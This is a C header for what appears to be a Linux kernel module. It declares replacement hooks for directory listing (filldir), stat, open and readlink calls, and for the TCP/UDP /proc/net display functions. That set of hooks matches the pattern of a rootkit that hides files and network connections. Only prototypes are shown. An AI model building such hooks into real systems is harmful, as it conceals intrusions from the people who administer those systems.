#ifndef PROTOTYPES_H
#define PROTOTYPES_H
#include <linux/version.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/delay.h>

#include <net/inet_sock.h>		
#include <linux/inet.h>			
#include <uapi/linux/uio.h>		
#include <uapi/linux/netlink.h>	
#include <uapi/linux/inet_diag.h>
#include <uapi/linux/sock_diag.h> 
#include <linux/ip.h>
#include <linux/ipv6.h>


#define SLEEP_DELAY 3

struct Extended_array {
    void *array_addr;
    int array_size;
};

// ===================================================================================================
//                                          files
// ===================================================================================================

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
extern bool (*real_filldir64)(struct dir_context *, const char *, int, loff_t, u64, unsigned int);
bool ex_filldir64(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type);
#else
extern int (*real_filldir64)(struct dir_context *, const char *, int, loff_t, u64, unsigned int);
int ex_filldir64(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type);
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
extern bool (*real_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned int);
bool ex_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type);
#else
extern int (*real_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned int);
int ex_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type);
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
extern int (*real_vfs_statx)(int, struct filename *, int, struct kstat *, u32);
int ex_vfs_statx(int dfd, struct filename *filename, int flags, struct kstat *stat, u32 request_mask);
#else
extern int (*real_vfs_statx)(int, const char __user *, int, struct kstat *, u32);
int ex_vfs_statx(int dfd, const char __user *filename, int flags, struct kstat *stat, u32 request_mask);
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 15, 0)
extern int (*real_do_sys_openat2)(int, const char __user *, struct open_how *);
int ex_do_sys_openat2(int dfd, const char __user *filename, struct open_how *how);
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0)
extern long (*real_do_sys_openat2)(int, const char __user *, struct open_how *);
long ex_do_sys_openat2(int dfd, const char __user *filename, struct open_how *how);
#else
extern long (*real_do_sys_open)(int, const char __user *, int, umode_t);
long ex_do_sys_open(int dfd, const char __user *filename, int flags, umode_t mode);
#endif

extern struct filename *(*real_getname)(const char __user *);

extern int (*real_do_readlinkat)(int, const char __user *, char __user *, int);
int ex_do_readlinkat(int dfd, const char __user *pathname, char __user *buf, int bufsiz);

// ===================================================================================================
//                                          network
// ===================================================================================================
enum Protocols {
    tcp,
    udp
};

enum IP_type {
    ipv4,
    ipv6
};

extern int (*real_tcp4_seq_show)(struct seq_file *, void *);
int ex_tcp4_seq_show(struct seq_file *seq, void *v);

extern int (*real_tcp6_seq_show)(struct seq_file *, void *);
int ex_tcp6_seq_show(struct seq_file *seq, void *v);

extern int (*real_udp4_seq_show)(struct seq_file *, void *);
int ex_udp4_seq_show(struct seq_file *seq, void *v);

extern int (*real_udp6_seq_show)(struct seq_file *, void *);
int ex_udp6_seq_show(struct seq_file *seq, void *v);

#endif  